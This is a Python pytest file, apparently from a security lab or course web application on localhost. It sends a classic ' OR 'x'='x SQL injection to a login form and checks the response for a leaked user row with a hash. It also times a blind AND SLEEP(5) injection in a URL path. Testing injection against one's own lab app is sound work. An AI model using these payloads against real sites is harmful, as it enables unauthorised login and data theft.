import sys, requests, pytest, time

def testClassic():
    s = requests.Session()
    r = s.post("https://localhost/login", data={'username' : "' OR 'x'='x", 'password': 'password'}, verify=False)
    s.close()
    if b"(&#39;pL41qCFwnagJcZsM&#39;, &#39;8c0f5ab2947a5a03c5275599e8b1cff2f7f281d07702a4082fcafa239b621ad8&#39;, &#39;chaim&#39;)" in r.content:
        print("Classic successful")
        return True
    return False

def testBlind():
    s = requests.Session()
    r = s.post("https://localhost/login", verify=False, data={'username':'test', 'password':'password'})
    start = time.time()
    r = s.get("https://localhost/get_id/webapp_is_pain.mp4'%20AND%20SLEEP(5)%20AND%20'x'='x", verify=False)
    end = time.time()
    s.close()
    print(start-end)
    print(r.content)
    if(abs(start - end) > 5):
        print("Blind successful")
        return True
    return False

def testSQLInjection():
    assert testClassic() and testBlind() == True
